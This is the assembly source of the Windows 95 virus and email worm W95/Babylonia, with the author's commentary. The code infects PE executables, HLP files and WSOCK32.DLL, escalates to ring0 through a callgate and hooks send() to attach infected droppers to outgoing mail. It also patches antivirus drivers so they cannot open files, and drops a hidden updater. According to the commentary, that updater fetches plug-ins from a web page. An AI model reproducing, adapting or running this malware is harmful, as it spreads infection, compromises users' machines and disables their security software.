컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[BABYLON.ASM]컴�
comment ^

W95/Babylonia.11036 - Set babylonia on fire!
(c) Vecna 1999

I am of the opinion that asm talk by itself to the worthwhile reader, so, i
will be brief...

This virus is a memory resident ring0/ring3 virus, infecting PE EXE files,
HLP files, and WSOCK32.DLL. The virus use EPO features, but no encryption or
poly at all, altought it can be updated via WWW. ;)

For much time, peoples where thinking about a virus upgradeable. Some attemps
where made, as W95/SK, that was able to run special preparated data in RAR
files. But how far the upgrade RAR packet can go? In this virus, i show my
implementation of a plugin format, with the modules(plug-ins) online at a
a WWW page.

The virus is also a advanced email worm, attaching itself to all outgoing
e-mails(no sending a new one as happy99), can deal with attachments already
in e-mail body, have BASE64 and uu-encode routines, and, more important, the
icon of the infected dropper sended by email change with the current date.

When a infected app(or dropper) is executed, the virus dont get control at
this moment. The virus patch a JMP or CALL, and wait be called. When this
happen, the virus load some APIs from KERNEL32.DLL memory image(using CRC32),
then jump to ring0 using a callgate. The infamous DESCRIPTOR 0 is used to
store the temporary data, breaking the pmode tabu ;)

While in ring0, the virus alloc some memory, and install a hook in IFS handler
and wait for access to PE EXE files, HLP files, and WSOCK32.DLL. The memory
is also scanned for presence of SPIDER.VXD(DrWeb) and AVP.VXD(Z0MBiE's lib).
If they're found, their code is patched in a way that it lose the ability of
open files. After returning control to the host, if the virus has just
installed memory resident, it drop the www updater to disk and spawn it.
More about the www updater below.

PE files when accessed are infected by having the virus appended to last
section, or overwrited if is was relocs, and with the CODE sections scanned
for a suitable place for a CALL VIRUS. HLP files have added a script that pass
control immediatly to virus code by using the callback features of the API of
USER32 EnumWindows().

When WSOCK32.DLL is accessed, the send() export is redirected to a chunk of
code in top of relocation info. This code get a ring0 memory pointer to the
new send() handler, by new added functionality to the GetFileAttibute() API ;)

The code in new send() scan the outgoing data by e-mail info, and add a
infected dropper at the end of it. The virus support both MIME and non-MIME
email clients, and can add the dropper in both uu-encoded and BASE64 format.
The icon of this dropper change together with the name, to reflect some dates.

All data carried with the virus is compressed using aPLib v0.22b library. I
change my old LZW scheme by this routines due the immense gain in speed,
compressed size, and code size. Is the same algorithm i used in Fabi.9608.

When the www updater is executed, it register itself, with the fake name of
KERNEL32.EXE, in registry, to run always, and copy itself to /winsys directory
to avoid easy detection. The updater hide himself in the CTRL+ALT+DEL task
list, and stay in background waiting for the user connect to the internet.

Always in background, without any user notice, the www updater then connect
to my www page, download the virus plug-ins(that have a special format, and
can be expanded, to have full compatibility with future versions). If these
modules complain with the version and features requeried to run, it is
executed. The power of this is obvious. By adding new plugins, i can make the
virus a irc-worm, infect remote drives, or even a poly engine. The problem of
the possible take down of my URL is bypassed with the smart use of forwarders
(not implemented in the public source version of the updater).

The first module online are the greetz to the peoples that helped me in this
virus, be with betatesting, be with ideas, be with moral support. Currently
i am working in new modules, with new ideas that i think will be worth of be
coded.

If you arent a d0rk, you can contact me at vecna_br@hotmail.com, but idiot
questions about how compile and like will be ignored... and your soul can be
lost in the attempt of contact me ;)

Questions about where's the entrypoint will be ignored too... ;>

^

.586p
.model flat
locals

       ofs equ offset
       by  equ byte ptr
       wo  equ word ptr
       dwo equ dword ptr
       fwo equ fword ptr

       TRUE  EQU 1
       FALSE EQU 0

include host.inc

_VIRUS segment dword use32 public 'KMARAI'

vcode equ this byte

DEBUG        equ FALSE                           ;debug version?

DROPPER_SIZE  equ 6144

ENTRY_READ   equ 128
SKIP_FIRST   equ 16

CRLF         equ <13,10>

CRC_POLY     equ 0EDB88320h
CRC_INIT     equ 0FFFFFFFFh

crc    macro   string                          ;jp/lapse macro
.radix 16d
       crcReg = CRC_INIT
       irpc _x, <string>
         ctrlByte = '&_x&' xor (crcReg and 0ff)
         crcReg = crcReg shr 8
         rept 8
           ctrlByte = (ctrlByte shr 1) xor (CRC_POLY * (ctrlByte and 1))
         endm
         crcReg = crcReg xor ctrlByte
       endm
       dd crcReg
.radix 10d
endm

_gdt   struc
limit  dw ?
base   dd ?
_gdt   ends

_descriptor struc
limit_l dw ?
base_l  dw ?
base_m  db ?
access  db ?
limit_h db ?
base_h  db ?
_descriptor ends

_jmpfar struc
jmpofs32 dd ?
selectr  dw ?
_jmpfar ends

_callback struc
offset_l dw ?
selector dw ?
attrib   dw ?
offset_h dw ?
_callback ends

wsize2 equ 260

hook   proc
       db 0e9h
  i_jmp dd 0                                   ;HLP redirector
hlp_start = ofs virusmain-$
       enter 20h, 0                            ;setup stack frame
       push ecx
       push ebx
       mov ebx, [ebp+0Ch]
       cmp bl, 33                              ;hookz ifs_attr
       je @@jmpcc
       cmp bl, 36                              ;hookz ifs_open
       je @@jmpcc
       cmp bl, 37                              ;hookz ifs_ren
  @@jmpcc:
  jmpcc equ by $
       jne @@noopen                            ;beware! near form of jnz
       mov ebx, ebp
       pusha
       call delta
       mov wo [ebp+(ofs jmpcc-ofs vcode)], 0e990h
       add esp, -wsize2
       mov edi, esp
       mov eax, [ebx+10h]
       inc al
       jz @@nodrive
       sub ax, -(":@"-1)
       stosw
  @@nodrive:
       push 0                                  ;BCS_WANSI
       push 255
       mov eax, [ebx+1ch]
       mov eax, [eax+0ch]
       inc eax
       inc eax
       inc eax
       inc eax
       push eax
       push edi
       push 400041h                            ;VxDCall UniToBCSPath
       call vxd
       add esp, 16
       dec edi                                 ;edi=start of name
       dec edi
       lea esi, [edi+eax-2]
       mov eax, [esi]
       not eax

       cmp eax, not '---.'
       jne @@no_special
       cmp wo [esi-10], '_\'
       jne @@no_special                        ;trying to access the backdoor?
       cmp dwo [ebx+0ch], 33                   ;file attr?
       jne @@no_special
       mov wo [ebp+(ofs backdoor-ofs vcode)], 9090h ;wsock32.dll is calling us
  @@no_special:

     IF DEBUG EQ TRUE
       cmp [esi-4], 'TAOG'
       jne @@shit
     ENDIF
       xor eax, not 'EXE.'                     ;esi=extension
       jnz @@try_hlp

doshdr  equ 0
peptr   equ 3ch
pehdr   equ doshdr+40h
cbfr    equ pehdr+0f8h
sectn   equ cbfr+100h
fsize   equ sectn+200h
epraw   equ fsize+4
vrva    equ epraw+4
lolimit equ vrva+4
uplimit equ lolimit+4
wsize4  equ uplimit+4

       add esp, -wsize4                        ;infect PE EXE files...
       mov esi, edi
       call open
       jc @@err
       call getsize
       mov [esp+fsize], eax
       cmp eax, DROPPER_SIZE                   ;my babies get better treatment
       je @@dropper
       call check_size
       jz @@err1
  @@dropper:
       mov esi, esp
       push 40h
       pop ecx
       sub edx, edx
       call read                               ;read 40h of header
       xor eax, ecx
       jnz @@err1
       movzx eax, wo [esi]
       not eax
       sub eax, not 'ZM'                       ;make sure is a EXE
       jnz @@err1

       cmp wo [esi+18h], 40h
       jb @@err1

       add cl, 0f8h-40h
       sub esi, -peptr
       lodsd
       xchg eax, edx
       call read
       jc @@err1
       call check_file                         ;already infected?
       jz @@err1

       movzx eax, wo [esi+22]
       test eax, 0102h
       jz @@err1
       test eax, 3000h                         ;executable/no dll
       jnz @@err1

       movzx ecx, wo [esi+6]
       cmp cl, 3
       jb @@err1                               ;too few sections
       push 0f8h
       imul ecx, ecx, 40
       pop edx
       add edx, [esp+peptr]
       lea esi, [esp+sectn]
       call read                               ;read section table
       sub edi, edi
       xchg edi, ecx
       mov eax, [esp+pehdr+40]
       sub eax, [esi+12]
       cmp eax, [esi+8]                        ;entrypoint in first section?
       ja @@err1
       add eax, [esi+20]                       ;raw ofs of entrycode
       mov [esp+epraw], eax

       mov eax, [esi+36]
       bts eax, 31                             ;make 1st sec +write
       jc @@err1                               ;and exit if already is
       bt eax, 5
       jnc @@err1                              ;need be CODE
       test eax, 10000000h+80h+40h
       jnz @@err1                              ;cant be SHARED or UDATA/DATA
       mov [esi+36], eax

       mov eax, [esi+12]
       mov [esp+lolimit], eax
       add eax, [esi+8]
       mov [esp+uplimit], eax                  ;boundaries of .code section
       mov ebx, -(ofs vend-ofs vcode)
       sub ecx, ebx
       mov eax, [esp+pehdr+160]
       sub eax, [esi+edi-40+12]
       jnz @@increase                          ;last section isnt relocs
       mov eax, [esi+edi-40+16]
       add eax, ebx
       jnb @@increase                          ;relocs too small
       sub eax, eax
       mov edx, eax
       add eax, [esi+edi-40+12]                ;rva of start of our code
       mov [esp+vrva], eax
       add edx, [esi+edi-40+20]
       jmp @@write
  @@increase:
       mov eax, [esi+edi-40+8]
       mov edx, eax
       add eax, [esi+edi-40+12]
       add edx, [esi+edi-40+20]
       mov [esp+vrva], eax                     ;rva of start of our code
       sub [esi+edi-40+8], ebx
       mov eax, [esi+edi-40+16]
       sub eax, ebx                            ;increase last section
       mov ebx, [esp+pehdr+60]
       dec ebx
       add eax, ebx
       not ebx
       and eax, ebx                            ;align raw section size
       mov [esi+edi-40+16], eax
  @@write:
       mov dwo [esi+edi-40+36], 0c0000040h
       sub dwo [esp+vrva], -(ofs virusmain-ofs vcode)
       add esi, edi
       add esi, (-40+8)
       lodsd
       xchg ebx, eax
       lodsd
       add ebx, eax                            ;rva+size
       mov eax, [esp+pehdr+56]
       dec eax
       add ebx, eax
       not eax
       and ebx, eax                            ;align it
       mov [esp+pehdr+80], ebx                 ;update imagesize
       mov esi, ebp
       pusha
       mov edx, [esp+epraw+((8*4))]
       push ENTRY_READ
       lea esi, [esp+cbfr+(8*4)+4]
       pop ecx
       call read                               ;read entrycode
       pusha
       push SKIP_FIRST
       pop eax
       add esi, eax                            ;skip first bytes(antiAV)
       sub ecx, eax
  @@jmp_call:
       lodsb
       cmp al, 0e8h                            ;call
       je @@found
       cmp al, 0e9h                            ;jmp
       je @@found
  @@loop1:
       loop @@jmp_call
       mov edi, [esp+(1*4)]                    ;put CALL at start
       push 5
       pop esi
       jmp @@calculate
  @@found:
       mov edi, esi
       lodsd                                   ;displacement
       mov edx, esi
       sub esi, [esp+(1*4)]                    ;turn to distance
       add eax, esi
       add eax, [esp+pehdr+40+(16*4)]          ;add entrypoint(our base)
       cmp eax, [esp+lolimit+(16*4)]
       jb @@out
       cmp eax, [esp+uplimit+(16*4)]           ;valid call?
       jb @@fine
  @@out:
       sub ecx, 4
       mov esi, edx
       jmp @@loop1
  @@fine:
       dec edi
  @@calculate:
       push esi
       mov esi, edi
       lodsb
       not eax
       mov by [ebp+(ofs instr1-ofs vcode)], al ;save modificated code
       lodsd
       not eax
       mov [ebp+(ofs instr2-ofs vcode)], eax
       pop ecx
       add ecx, [esp+pehdr+40+(16*4)]          ;add entrypoint
       mov al, 0e8h
       stosb
       mov eax, [esp+vrva+(16*4)]              ;our rva
       sub eax, ecx
       stosd                                   ;build call to it
       popa
       call write                              ;write entrycode
       popa
       call write                              ;write virus body
       sub edx, edx
       push 0f8h
       lea esi, [esp+peptr+4]
       lodsd
       pop ecx
       xchg edx, eax
       bts wo [esi+22], 0
       mov [esi+160], eax                      ;strip relocs
       mov [esi+164], eax
       call write                              ;write old header
       add edx, eax
       movzx ecx, wo [esi+6]
       imul ecx, ecx, 40
       sub esi, -(sectn-pehdr)
       call write                              ;write section table
  @@err1:
       call close
  @@err:
       add esp, wsize4

  @@try_hlp:
       xor eax, not 'PLH.' xor not 'EXE.'
       jnz @@wsockdll

buffer    equ 0                                ;stack frame
old_ofs   equ 4
old_sz    equ 8
patch1    equ 12
wsize3    equ 16

mainhdr   equ 0                                ;buffer structure
pagedir   equ 10h
syshdr    equ 210h
build     equ 225h

       add esp, -wsize3                        ;infect HLP files...
       mov esi, edi
       call open
       jc @@error000
       push 32*1024
       push 040000dh                           ;getheap
       call vxd
       pop ecx
       mov [esp+buffer], eax
       mov esi, eax                            ;esi=buffer.mainhdr
       push 10h
       pop ecx
       sub edx, edx
       call read                               ;read 10h of header
       jc @@free
       lodsd
       xor eax, 035f3fh                        ;hlp signature?
       jnz @@free
       lodsd
       lea edx, [eax+37h]                      ;edx=directory offset
       mov ecx, 200h
       lodsd
       lodsd                                   ;esi=buffer.pagedir
       call read
       mov ecx, eax
  @@search:
       dec ecx
       jz @@free
       cmp dwo [esi+ecx], 'SYS|'
       jnz @@search
       cmp dwo [esi+ecx+4], 'MET'
       jnz @@search
       mov eax, [esi-4]                        ;eax=end of file
       xchg eax, [esi+ecx+8]                   ;section code = end of file
       xchg eax, edx
       push 15h
       push 15h
       sub esi, -(syshdr-pagedir)
       pop ecx
       call read                               ;read sys hdr
       mov ecx, [esi]
       pop eax
       sub ecx, eax
       add edx, eax
       mov [esp+old_ofs], edx
       mov [esp+old_sz], ecx                   ;save old code position/size
       mov edi, [esp.buffer]
       sub edi, -build
       lea esi, [ebp+(ofs hlp1_s-ofs vcode)]
       lea eax, [edi+(ofs _size-ofs hlp1_s)]
       mov [esp.patch1], eax
       push hlp1_sz
       pop ecx
  @@decr:
       lodsb                                    ;copy start macro
       not al
       stosb
       loop @@decr
       push edi                                ;edi=buffer
       mov dwo [ebp+(ofs i_jmp-ofs vcode)], hlp_start
       lea esi, [ebp+(ofs vend-ofs vcode)]
  @@next:
       add esi, -4
       mov eax, [esi]
       call check
       test edx, edx                           ;can make it directly?
       jnz @@ext
       mov al, 12h                             ;push ?
     org $-1
       push 12345678h
     org $-4
       stosb
       mov eax, [esi]
       stosd
       jmp @@done_
  @@ext:
       mov al, 0b8h                            ;mov eax, ?
       stosb
       mov eax, [esi]
       xor eax, edx
       stosd
       mov al, 35h                             ;xor eax, ?
       stosb
       mov eax, edx
       stosd
       mov al, 50h                             ;push eax
       stosb
  @@done_:
       cmp esi, ebp
       jne @@next
       pop eax
       mov ecx, edi
       sub ecx, eax                            ;ecx=poly code
       sub eax, eax
       mov dwo [esi+(ofs i_jmp-ofs vcode)], eax
       push ecx
       add ecx, (ofs hlp1_e-ofs p1)+(ofs hlp2_e-ofs hlp1_e)
       mov eax, [esp.patch1+4]
       mov wo [eax], cx                        ;patch macro size
       sub esi, -(ofs hlp1_e-ofs vcode)
       push hlp2_sz
       pop ecx
       rep movsb                               ;copy end macro
       pop eax
       mov esi, [esp.buffer]
       sub esi, -syshdr
       add eax, hlp2_e-hlp1_s
       add [esi], eax
       add [esi+4], eax                        ;fix syshdr size
       mov esi, edi
       mov edx, [esp.old_ofs]
       mov ecx, [esp.old_sz]
       sub eax, ecx                            ;old script too large?
       jbe @@free
       call read                               ;read old code
       cmp [esi+4], "`(RR"
       je @@free                               ;probably already infected
       mov ebp, [esp.buffer]                   ;ebp=buffer
       lea ecx, [edi+eax]
       sub ecx, ebp                            ;ecx=our size
       add ecx, -syshdr
       mov edx, [ebp.mainhdr+12]
       lea esi, [ebp.syshdr]
       call write                              ;write our code
       mov esi, [esp.buffer]
       push 10h
       add [esi.mainhdr+12], eax
       sub edx, edx
       pop ecx
       call write                              ;write main header
       mov edx, [esi.mainhdr+4]
       sub edx, -37h
       mov ecx, 200h
       add esi, pagedir
       call write                              ;write directory
  @@free:
       push dwo [esp+buffer]
       push 040000eh                           ;freeheap
       call vxd
       pop eax
       call close                              ;close file
  @@error000:
       add esp, wsize3

  @@wsockdll:
;       xor eax, not 'EXE.' xor not 'PLH.' xor not 'LLD.'
       xor eax, 01c000c00h
       jnz @@shit
     IF DEBUG EQ FALSE
       mov eax, [esi-4]
       mov esi, [esi-8]
       not eax
       xchg eax, esi
       not eax
       cmp esi, not '23KC'
       jne @@shit
       cmp eax, not 'OSW\'
       jne @@shit
     ENDIF

obufer   equ 0                                 ;stack frame
header   equ obufer+3ch
pe_hdr   equ header+4
section  equ pe_hdr+0f8h
export   equ section+200h
vofs     equ export+4
vraw     equ vofs+4
etable   equ vraw+4
wsize1   equ etable+(4*20)

       add esp, -wsize1                        ;patch WSOCK32.DLL...
       mov esi, edi
       call open
       jc @@error0
       call getsize
       mov edi, eax
       call check_size
       jz @@error1
       sub edx, edx
       mov ecx, 40h
       lea esi, [esp+obufer]
       call read
       cmp wo [esp+obufer], 'ZM'
       jne @@error1
       push 0f8h
       pop ecx
       mov edx, [esp+header]
       cmp edx, edi
       jae @@error1                            ;point outside of the file?
       lea esi, [esp+pe_hdr]
       call read
       jc @@error1
       call check_file
       jz @@error1
       call write                              ;write pe header
       add edx, eax
       movzx ecx, wo [esi+6]
       push ecx
       imul ecx, ecx, 40
       lea esi, [esp+section+4]
       call read                               ;read section table
       pop ecx
  @@writeable:
       bts dwo [esi+36], 31                    ;make all sections writeable
       sub esi, -40
       loop @@writeable
       mov [esi-40+36], 0c0000040h
       mov ecx, [esi-40+8]                     ;increase last section
       push ecx
       add ecx, [esi-40+20]
       mov [esp+vraw+4], ecx                   ;raw of our patch
       pop ecx
       add ecx, [esi-40+12]
       mov [esp+vofs], ecx                     ;rva of our patch
       add dwo [esi-40+8], (ofs pend-ofs pstart)
       mov ebx, [esi-40+8]
       cmp ebx, [esi-40+16]
       jbe @@fit
       mov ecx, [esp+pe_hdr+60]
       dec ecx
       add ebx, ecx
       not ecx
       and ebx, ecx
       mov [esi-40+16], ebx                    ;align
  @@fit:
       xchg eax, ecx
       lea esi, [esp+section]
       call write
       mov eax, [esp+pe_hdr+120]               ;eax=export table
       call rva2raw
       xchg eax, edx
       push 4
       pop ecx
       sub edx, -28
       lea esi, [esp+export]
       call read                               ;read export table addresses
       mov eax, [esi]
       call rva2raw
       xchg eax, edx
       push (4*20)
       pop ecx
       lea esi, [esp+etable]                   ;read 20 exports
       call read
       mov eax, [esp+vofs]
       mov edi, [esp+pe_hdr+52]                ;wsock32 base
       sub eax, -(ofs send-ofs pstart)
       xchg [esi+(4*18)], eax                  ;hook send
       add edi, eax
       mov [ebp+(ofs oldsend-ofs vcode)], edi
       mov [ebp+(ofs _send-ofs vcode)], edi
       call write
       mov edx, [esp+vraw]
       push (ofs pend-ofs pstart)
       pop ecx
       call delta
       sub ebp, -(ofs pstart-ofs vcode)
       xchg esi, ebp
       call write                              ;write our patch
  @@error1:
       call close
  @@error0:
       add esp, wsize1

  @@shit:
       add esp, wsize2                         ;release tmp buffer
       mov wo [ebp+(ofs jmpcc-ofs vcode)], 0850fh
       popa

  @@noopen:
       push 6
       push 1Ch
       pop ebx
       pop ecx                                 ;total=6 paramz
  @@nparam:
       mov eax, [ebp+ebx]                      ;copy paramz from old frame
       push eax                                ;to new frame
       add ebx, -4
       loop @@nparam
       db 0b8h                                 ;mov eax, ?
  oldhook dd 0
       call [eax]                              ;call old hookz
       add esp, 6*4

  backdoor equ $
       jmp @@closed
       call @@delta
  @@delta:
       pop ecx
       add ecx, (ofs my_send-ofs @@delta)
       mov wo [ecx-(ofs my_send-ofs backdoor)], ((ofs @@closed-(ofs backdoor+2))*100h)+0ebh
       mov ebx, [ebp+1ch]                      ;ioreq
       push esi
       mov esi, [ebx+14h]
       lodsd                                    ;c:\_
       sub eax, eax
       mov ebx, eax
  @@byte:
       lodsb                                   ;get filename char
       inc ah
       sub al, 'A'
       or bl, al                               ;build address
       cmp ah, 8
       je @@doneb
       shl ebx, 4
       jmp @@byte
  @@doneb:
       mov [ebx], ecx                          ;patch requested address
       pop esi
  @@closed:

       pop ebx
       pop ecx
       leave
       ret
hook   endp


delta  proc
       call @@delta
  @@delta:
       pop ebp
       add ebp, -(ofs @@delta-ofs vcode)
       ret
delta  endp


check_file proc
       mov eax, [esi]
       not eax
       cmp eax, not 'EP'
       jne @@error
       cmp wo [esi+4], 14ch                    ;386
       jb @@error
       cmp wo [esi+4], 14eh                    ;586
       ja @@error
       xor eax, edx                            ;(not('PE')xor(pe_ofs)xor(entry))
       bswap eax
       xor eax, [esi+40]
       cmp [esi+8], eax                        ;infected?
       mov [esi+8], eax
       db 066h, 0b8h                           ;mov ax, ?
  @@error:
       sub eax, eax
       ret
check_file endp


gdt      equ 0
idt      equ 6
ring0_cs equ 12
ring0_ds equ 16
jmpfar   equ 20
wsize    equ 26

kernel32 equ 0bff70000h

virusmain proc
       pushf
       pusha
       add esp, -wsize
       cld
       sub eax, eax
       call @@seh
       mov esp, [esp+8]                        ;hmm... SEH... :/
       jmp @@installed
  @@seh:
       push dwo fs:[eax]
       mov fs:[eax], esp
       mov esi, [kernel32+80h+120]             ;get kernel32 APIs...
       mov esi, [esi]
       sub esi, -(kernel32+24)                 ;esi=export directory+24
       lodsd
       push eax
       lodsd
       push eax
       lodsd
       xchg ebx, eax
       pop ebp                                  ;ebp=RVA table
       pop ecx                                  ;ecx=number of names
       lodsd
       xchg esi, eax                            ;esi=names table
       xchg esi, ebx                            ;ebx=ordinal table
       mov edx, -kernel32
       sub esi, edx
       sub ebp, edx
       sub ebx, edx                            ;edx=-kernel32
       sub edi, edi
  @@loopy:
       inc edi                                 ;edi=ordinal counter
       lodsd                                   ;eax=API name string
       pusha
       sub eax, edx
       xchg eax, esi
       push CRC_INIT                           ;calculate crc of string
       pop ecx
  @@next_byte:
       lodsb
       test al, al
       jz @@done
       xor cl, al
       mov al, 8
  @@next_bit:
       shr ecx, 1
       jnc @@poly
       xor ecx, CRC_POLY
  @@poly:
       dec al
       jnz @@next_bit
       jmp @@next_byte
  @@done:
       call @@delta1
  @@delta1:
       pop esi
       add esi, (ofs _openfile-ofs @@delta1)
       cmp ecx, 12345678h                      ;crcz of API
     org $-4
       crc <CreateFileA>
       je @@patch_api
       sub esi, -((ofs _getfattr-ofs vcode)-(ofs _openfile-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <GetFileAttributesA>
       je @@patch_api
       sub esi, -((ofs _writefile-ofs vcode)-(ofs _getfattr-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <WriteFile>
       je @@patch_api
       add esi, ((ofs _closehandle-ofs vcode)-(ofs _writefile-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <CloseHandle>
       je @@patch_api
       sub esi, -((ofs _seekfile-ofs vcode)-(ofs _closehandle-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <SetFilePointer>
       je @@patch_api
       add esi, (ofs _loadl-ofs vcode)-(ofs _seekfile-ofs vcode)
       cmp ecx, 12345678h
     org $-4
       crc <LoadLibraryA>
       je @@patch_api
       add esi, (ofs _freel-ofs vcode)-(ofs _loadl-ofs vcode)
       cmp ecx, 12345678h
     org $-4
       crc <FreeLibrary>
       je @@patch_api
       sub esi, -((ofs _getproc-ofs vcode)-(ofs _freel-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <GetProcAddress>
       je @@patch_api
       add esi, (ofs _gsystime-ofs vcode)-(ofs _getproc-ofs vcode)
       cmp ecx, 12345678h
     org $-4
       crc <GetSystemTime>
       je @@patch_api
       sub esi, -((ofs _fdelete-ofs vcode)-(ofs _gsystime-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <DeleteFileA>
       je @@patch_api
       add esi, (ofs _readfile-ofs vcode)-(ofs _fdelete-ofs vcode)
       cmp ecx, 12345678h
     org $-4
       crc <ReadFile>
       je @@patch_api
       add esi, (ofs _getmhandle-ofs vcode)-(ofs _readfile-ofs vcode)
       cmp ecx, 12345678h
     org $-4
       crc <GetModuleHandleA>
       je @@patch_api
       sub esi, -((ofs _winexec-ofs vcode)-(ofs _getmhandle-ofs vcode))
       cmp ecx, 12345678h
     org $-4
       crc <WinExec>
       jne  @@end_loopy

  @@patch_api:
       movzx eax, wo [ebx+(edi*2)]             ;get ordinal
       dec eax
       mov eax, [ebp+(eax*4)]                  ;get rva
       sub eax, edx
       mov [esi], eax                          ;got it!
  @@end_loopy:
       popa
       dec ecx
       jnz @@loopy                            ;all APIs scanned

       call delta
       lea eax, [ebp+(ofs wsock-ofs vcode)]
       push eax
       db 0b8h
  _loadl dd 0
       call eax                                ;load wsock32.dll
       xchg eax, ecx
       jecxz @@suxx
       push ecx                                ;for FreeLibrary
       call @@send
       db 'send', 0
  @@send:
       push ecx
       db 0b8h+7                               ;GetProcAddress
  _getproc dd 0
       call edi
       cmp by [eax], 0e8h                      ;the difference between masters
       jne @@isnt                              ;and pupils ;)
       cmp by [eax+5], 0b8h
       jne @@isnt
       mov eax, [eax+6]                        ;get real addy :)
  @@isnt:
       mov [ebp+(ofs oldsend-ofs vcode)], eax
       db 0b8h
  _freel dd 0
       call eax
  @@suxx:

       push 8
       push ebp
       pop esi
       push (ofs vend-ofs vcode)/4             ;make sure we're commited
       pop ecx
       rep lodsd
       pop eax
       lea edi, [ebp+(ofs myname-ofs vcode)]
       xchg eax, ecx
       rep stosd

       mov ebp, esp                            ;jmp2ring0...
       push 1
       sgdt [ebp+gdt]                          ;get global descriptor table
       sidt [ebp+idt]                          ;get interrupt table
       mov esi, [ebp+gdt.base]
       mov edi, esi
       movzx ecx, wo [ebp+gdt.limit]
       pop ebx
  @@search_gdt:
       sub eax, eax
       cmp wo [esi.limit_l], 0ffffh
       jne @@next_descriptor
       cmp by [esi.limit_h], 0cfh              ;descriptor start at 0?
       jne @@next_descriptor
       cmp wo [esi.base_l], ax                 ;and cover the whole range?
       jne @@next_descriptor
       cmp by [esi.base_m], al
       jne @@next_descriptor
       cmp by [esi.base_h], al
       jne @@next_descriptor                   ;is a flat descriptor!
       cmp [esi.access], 9bh
       jne @@no_code                           ;is a code descriptor?
       mov eax, esi
       sub eax, [ebp+gdt.base]
       mov [ebp+ring0_cs], eax                 ;yes, save it!
       shl ebx, 1
       jmp @@next_descriptor
  @@no_code:
       cmp [esi.access], 93h
       jne @@next_descriptor                   ;is a data descriptor?
       mov eax, esi
       sub eax, [ebp+gdt.base]
       mov [ebp+ring0_ds], eax                 ;yes, save it!
       shl ebx, 1
  @@next_descriptor:
       lodsd
       lodsd
       bt ebx, 2                               ;our 2 descriptors found?
       jc @@search_done
       loop @@search_gdt
       jmp @@installed                         ;flat descriptors dont found
  @@search_done:
       mov esi, edi                            ;esi=1st entry
       lodsd                                   ;edi=nul entry
       lodsd
       test eax, eax                           ;nul entry isnt empty?
       jnz @@installed                         ;then already resident
       pusha
       movsd
       movsd                                   ;backup 1st descriptor
       popa
       mov eax, dwo [ebp+ring0_cs]
       mov wo [esi.selector], ax               ;ring0 code selector
       mov wo [esi.attrib], 0ec00h
       call @@over_ring0_code                  ;[esp]=ring0 code

  @@ring0_code:
       mov ds, ax
       mov es, ax                              ;setup data access
       xchg esi, edi
       movsd                                   ;restore 1st descriptor
       movsd

       mov edi, ebp
       mov ebx, [edi.gdt.base]
       movzx ecx, wo [edi.gdt.limit]
       call protect                             ;make gdt read only
       mov ebx, [edi.idt.base]
       movzx ecx, wo [edi.idt.limit]
       call protect                             ;make idt read only

       push 00270005h
       call vxd                                ;VXDLDR GetDeviceList
  @@next:
       mov ebx, [eax+5]                        ;VxD_Desc_Block *DI_DDB
       sub ebx, 0C0000000h
       jc @@next_vxd
       lea ecx, [ebx+0C000000Ch]               ;Name_0
       cmp [ecx], 'DIPS'                       ;'SPIDER  '
       je @@patch
       cmp [ecx], '9PVA'                       ;'AVP95   '
       jne @@next_vxd
  @@patch:
       push 0000D500h                          ;R0_OPENCREATFILE
       pop esi
       call ScanVxd
       inc esi                                 ;R0_OPENCREAT_IN_CONTEXT
       call ScanVxd
  @@next_vxd:
       mov eax, [eax]
       or eax, eax
       jnz @@next

       push 9
       push eax
       push eax
       push eax
       push eax
       push eax
       push 1
       push 64/4                               ;memory for email shitz
       push 010053h
       call vxd
       add esp, 8*4
       test eax, eax
       jz @@fucked
       mov [ebp+(ofs mem_temp-ofs vcode)], eax
  @@fucked:
       push (ofs vend-ofs vcode)
       push 9
       push eax
       push eax
       push eax
       push eax
       push eax
       push 1
       push (((ofs vend-ofs vcode)+4095)/4096)
       push 010053h                            ;PageAlloc
       call vxd
       add esp, 8*4
       test eax, eax
       jz @@fuck
       mov edi, eax
       xchg eax, ecx
       xchg ecx, [esp]                         ;pop size/push &hook
       push ebp
       pop esi
       rep movsb
       mov [edi+(ofs i_jmp-ofs vcode)-(ofs vend-ofs vcode)], ecx
       mov [edi+(ofs socket_out-ofs vcode)-(ofs vend-ofs vcode)], ecx
       mov wo [edi+(ofs jmpcc-ofs vcode)-(ofs vend-ofs vcode)], 0850fh
       push 00400067h                          ;install ifs hook
       call vxd
       mov [edi+(ofs oldhook-ofs vcode)-(ofs vend-ofs vcode)], eax
  @@fuck:
       pop eax
       retf

  @@over_ring0_code:
       pop eax
       mov ebx, eax
       shr eax, 16
       mov wo [esi.offset_l], bx               ;address of routine
       mov wo [esi.offset_h], ax
       push 0
       pop dwo [ebp+jmpfar.jmpofs32]
       mov wo [ebp+jmpfar.selectr], 8          ;jmp to callback 1
       mov eax, dwo [ebp+ring0_ds]             ;set ring0 data
       push ds
       push es
       cli
       call fwo [ebp+jmpfar]                   ;call our ring0 code
       cli
       pop es
       pop ds
  @@installed:
       sub eax, eax
       pop dwo fs:[eax]                            ;remove SEH
       pop ecx

       call delta
       mov eax, [ebp+(ofs mem_temp-ofs vcode)]
       test eax, eax
       jz @@no_ready

       push eax
       call @@over

include updater.inc

  @@over:
       call _aP_depack_asm                     ;unpack updater data
       push eax
       push 2
       pop ecx
       lea esi, [ebp+(ofs dropname-ofs vcode)]
       call r3_open
       pop ecx
       jz @@no_ready
       mov esi, [ebp+(ofs mem_temp-ofs vcode)]
       call r3_write
       call r3_close

       push 0
       lea eax, [ebp+(ofs dropname-ofs vcode)]
       push eax
       db 0b8h
  _winexec dd 0
       call eax

  @@no_ready:

       cmp dwo [ebp+(ofs i_jmp-ofs vcode)], 0
       je @@pe_exe

       add esp, wsize
       popa
       popf
       add esp, (ofs vend-ofs vcode)
       sub eax, eax                            ;stop enumeration
       ret 8                                   ;return to callback
  @@pe_exe:
       lea eax, [esp+wsize+(9*4)]
       mov edi, [eax]
       sub edi, 5                              ;return place
       mov [eax], edi
       mov al, not 0b8h
  instr1 equ by $-1
       not eax
       stosb
       mov eax, 12345678h
  instr2 equ dwo $-4
       not eax
       stosd
       add esp, wsize
       popa
       popf
       ret                                     ;return to same place!
